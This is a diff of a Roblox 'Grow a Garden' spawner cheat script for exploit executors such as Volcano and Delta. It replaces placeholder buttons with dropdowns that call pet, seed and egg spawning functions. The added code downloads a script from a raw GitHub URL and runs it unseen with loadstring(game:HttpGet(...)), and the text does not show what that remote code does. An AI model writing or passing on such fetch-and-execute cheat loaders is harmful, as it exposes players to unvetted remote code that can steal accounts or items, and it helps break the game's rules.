@@ -1,60 +1,87 @@
+-- Grow a Garden Spawner GUI with Dropdowns
+-- Hosted loader-compatible script for Volcano, Delta, etc.
+
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
-local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
--- GUI Setup
-local gui = Instance.new("ScreenGui")
-gui.Name = "GardenSpawnerUI"
-gui.ResetOnSpawn = false
-gui.Parent = PlayerGui
+local Spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/ataturk123/GardenSpawner/refs/heads/main/Spawner.lua"))()
+Spawner.Load()
 
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 300, 0, 250)
-frame.Position = UDim2.new(0.5, -150, 0.5, -125)
-frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-frame.BorderSizePixel = 0
-frame.Parent = gui
+-- UI Library (Simple Dropdown GUI)
+local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 300, 0, 300)
+Frame.Position = UDim2.new(0.5, -150, 0.5, -150)
+Frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+Frame.BorderSizePixel = 0
+Frame.Parent = ScreenGui
 
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 40)
-title.BackgroundTransparency = 1
-title.Text = "🌿 Garden Spawner"
-title.TextColor3 = Color3.new(1, 1, 1)
-title.Font = Enum.Font.SourceSansBold
-title.TextScaled = true
-title.Parent = frame
+local function createDropdown(labelText, items, callback)
+    local label = Instance.new("TextLabel")
+    label.Text = labelText
+    label.Size = UDim2.new(1, 0, 0, 25)
+    label.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    label.Parent = Frame
 
--- Helper to create buttons
-local function createButton(text, positionY, callback)
-    local button = Instance.new("TextButton")
-    button.Size = UDim2.new(1, -20, 0, 40)
-    button.Position = UDim2.new(0, 10, 0, positionY)
-    button.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-    button.TextColor3 = Color3.new(1, 1, 1)
-    button.Text = text
-    button.Font = Enum.Font.SourceSans
-    button.TextScaled = true
-    button.Parent = frame
-    button.MouseButton1Click:Connect(callback)
+    local dropdown = Instance.new("TextButton")
+    dropdown.Size = UDim2.new(1, 0, 0, 25)
+    dropdown.Position = UDim2.new(0, 0, 0, #Frame:GetChildren() * 30)
+    dropdown.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+    dropdown.TextColor3 = Color3.fromRGB(255, 255, 255)
+    dropdown.Text = "Choose..."
+    dropdown.Parent = Frame
+
+    dropdown.MouseButton1Click:Connect(function()
+        local menu = Instance.new("Frame")
+        menu.Size = UDim2.new(1, 0, 0, math.min(#items, 10) * 25)
+        menu.Position = UDim2.new(0, 0, 0, dropdown.Position.Y.Offset + 25)
+        menu.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        menu.Parent = Frame
+
+        for i, item in ipairs(items) do
+            local option = Instance.new("TextButton")
+            option.Size = UDim2.new(1, 0, 0, 25)
+            option.Position = UDim2.new(0, 0, 0, (i - 1) * 25)
+            option.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+            option.TextColor3 = Color3.fromRGB(255, 255, 255)
+            option.Text = item
+            option.Parent = menu
+
+            option.MouseButton1Click:Connect(function()
+                dropdown.Text = item
+                callback(item)
+                menu:Destroy()
+            end)
+        end
+    end)
 end
 
--- Example Functions (replace these with actual spawning code)
-local function spawnPet()
-    print("Spawning pet: Raccoon")
-    -- Example: Spawner.SpawnPet("Raccoon", 1, 2)
-end
+-- Pets Dropdown
+local pets = {
+    "Raccoon", "Butterfly", "Bee", "Flamingo", "Caterpillar",
+    "Bat", "Mole", "Worm", "Skunk", "Snail",
+    "Shiny Raccoon", "Golden Butterfly", "Dark Caterpillar"
+}
+createDropdown("Spawn Pet", pets, function(pet)
+    Spawner.SpawnPet(pet, 1, 2)
+end)
 
-local function spawnSeed()
-    print("Spawning seed: Candy Blossom")
-    -- Example: Spawner.SpawnSeed("Candy Blossom")
-end
+-- Seeds Dropdown
+local seeds = {
+    "Sunflower", "Carrot", "Candy Blossom", "Corn", "Moon Berry",
+    "Golden Carrot", "Crystal Corn"
+}
+createDropdown("Spawn Seed", seeds, function(seed)
+    Spawner.SpawnSeed(seed)
+end)
 
-local function spawnEgg()
-    print("Spawning egg: Night Egg")
-    -- Example: Spawner.SpawnEgg("Night Egg")
-end
+-- Eggs Dropdown
+local eggs = {
+    "Common Egg", "Uncommon Egg", "Rare Egg", "Mythical Egg", "Night Egg"
+}
+createDropdown("Spawn Egg", eggs, function(egg)
+    Spawner.SpawnEgg(egg)
+end)
 
--- Buttons
-createButton("🐾 Spawn Pet", 50, spawnPet)
-createButton("🌱 Spawn Seed", 100, spawnSeed)
-createButton("🥚 Spawn Egg", 150, spawnEgg)
+print("Grow a Garden GUI loaded with dropdowns.")
